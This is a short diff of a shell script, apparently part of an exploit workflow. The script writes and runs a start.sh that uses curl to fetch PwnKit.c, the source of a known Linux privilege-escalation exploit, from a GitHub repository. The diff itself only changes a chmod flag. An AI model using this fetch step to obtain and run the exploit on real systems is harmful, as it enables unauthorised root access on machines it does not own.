@@ -1,6 +1,6 @@
 echo "Creating SH File..."
 echo "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c" > start.sh
-chmod +x ./start.sh
+chmod u+x ./start.sh
 echo "Fetching C source..."
 ./start.sh
 echo "Done."
